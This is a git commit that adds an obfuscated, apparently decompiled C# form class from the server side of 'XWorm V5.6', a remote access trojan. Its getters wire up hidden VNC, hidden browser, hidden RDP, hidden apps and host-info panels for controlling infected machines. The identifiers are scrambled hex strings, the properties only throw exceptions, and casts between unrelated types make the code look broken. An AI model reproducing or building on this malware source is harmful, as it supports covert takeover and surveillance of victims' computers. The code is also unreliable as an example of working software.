85e0cd5fa8d032cde6e933c3d1c822c11d373a74
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:50:53 +0400

    Forms38.cs

---
+++ XWorm V5.6/Server/Forms/Forms38.cs
@@ -0,0 +1,96 @@
+﻿using AFBAC6A22892AEE1C0901CA443F1E9FF;
+using B55951D293DD740F7B3577CE2C48A401;
+using B8004B6A490C56212B3407F78898F3F8;
+using F6F8EED9333F0F8D71E7A14D31419906;
+using FB656BD0FD55CB0EE5FF3EDFB047FABD;
+using FF2D6F102A260C25FF3FD3711F3F0BB9;
+using IF0FF1FFB1CA752C08C9910B024F129F;
+using IF7ECB736801D875D48E6C65CE1BIEF6;
+using L52LFCBD56B2E807B7EC8CEFDB5458AC;
+using System;
+using System.Diagnostics;
+using System.Runtime.CompilerServices;
+
+namespace I133EDD8311397I037I09A90I9D29E6F
+{
+  public class IDD9EAACDE218374CBIBD65DF882F241 : I2F88ED16A41I5FEI8E9B06BFCAF5E96
+  {
+    public static int DE24D0A5DE981304A9C69B75AB527BB7;
+    public static int CA24F89FF8B0E843CF86685621513794;
+    public static int PDPD7E18D9128FACA56F8F9827P91733;
+
+    public string sUrl
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("き");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("げ");
+    }
+
+    public string sTitle
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("さ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("ち");
+    }
+
+    public int iCount
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("だ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("へ");
+    }
+
+    [DebuggerHidden]
+    [SpecialName]
+    public FAFCD0C18FFE8F29EF883C1B32FB3915 get_Fun()
+    {
+      ((F52F19CDAAECA06421655E747A6BC70E) this).m_Fun = IA0AD4B699F26I4B2F7CFCF52I427780.Create__Instance__<FAFCD0C18FFE8F29EF883C1B32FB3915>(((F52F19CDAAECA06421655E747A6BC70E) this).m_Fun);
+      return ((F52F19CDAAECA06421655E747A6BC70E) this).m_Fun;
+    }
+
+    [DebuggerHidden]
+    [SpecialName]
+    public U74CC57DU9422UA94U8D1CC4FD42D357 get_HApps()
+    {
+      ((F52F19CDAAECA06421655E747A6BC70E) this).m_HApps = IA0AD4B699F26I4B2F7CFCF52I427780.Create__Instance__<U74CC57DU9422UA94U8D1CC4FD42D357>(((F52F19CDAAECA06421655E747A6BC70E) this).m_HApps);
+      return ((F52F19CDAAECA06421655E747A6BC70E) this).m_HApps;
+    }
+
+    [DebuggerHidden]
+    [SpecialName]
+    public B10DBCC1C9B885C02456BBDA3D2B71CA get_HBrowser()
+    {
+      ((F52F19CDAAECA06421655E747A6BC70E) this).m_HBrowser = IA0AD4B699F26I4B2F7CFCF52I427780.Create__Instance__<B10DBCC1C9B885C02456BBDA3D2B71CA>(((F52F19CDAAECA06421655E747A6BC70E) this).m_HBrowser);
+      return ((F52F19CDAAECA06421655E747A6BC70E) this).m_HBrowser;
+    }
+
+    [DebuggerHidden]
+    [SpecialName]
+    public F52F19CDAAECA06421655E747A6BC70E get_Hosts()
+    {
+      ((F52F19CDAAECA06421655E747A6BC70E) this).m_Hosts = IA0AD4B699F26I4B2F7CFCF52I427780.Create__Instance__<F52F19CDAAECA06421655E747A6BC70E>(((F52F19CDAAECA06421655E747A6BC70E) this).m_Hosts);
+      return ((F52F19CDAAECA06421655E747A6BC70E) this).m_Hosts;
+    }
+
+    [DebuggerHidden]
+    [SpecialName]
+    public E8AC5898DDA66BCEB297A63FD977EA10 get_HRDP()
+    {
+      ((F52F19CDAAECA06421655E747A6BC70E) this).m_HRDP = IA0AD4B699F26I4B2F7CFCF52I427780.Create__Instance__<E8AC5898DDA66BCEB297A63FD977EA10>(((F52F19CDAAECA06421655E747A6BC70E) this).m_HRDP);
+      return ((F52F19CDAAECA06421655E747A6BC70E) this).m_HRDP;
+    }
+
+    [DebuggerHidden]
+    [SpecialName]
+    public A5AC87BA8FE91E86115A091087760C0E get_HVNC()
+    {
+      ((E8AC5898DDA66BCEB297A63FD977EA10) this).m_HVNC = IA0AD4B699F26I4B2F7CFCF52I427780.Create__Instance__<A5AC87BA8FE91E86115A091087760C0E>(((E8AC5898DDA66BCEB297A63FD977EA10) this).m_HVNC);
+      return ((E8AC5898DDA66BCEB297A63FD977EA10) this).m_HVNC;
+    }
+
+    [DebuggerHidden]
+    [SpecialName]
+    public FCE2AEFA30BEDC4920772698367176BB get_INFO()
+    {
+      ((E8AC5898DDA66BCEB297A63FD977EA10) this).m_INFO = IA0AD4B699F26I4B2F7CFCF52I427780.Create__Instance__<FCE2AEFA30BEDC4920772698367176BB>(((E8AC5898DDA66BCEB297A63FD977EA10) this).m_INFO);
+      return ((E8AC5898DDA66BCEB297A63FD977EA10) this).m_INFO;
+    }
+  }
+}
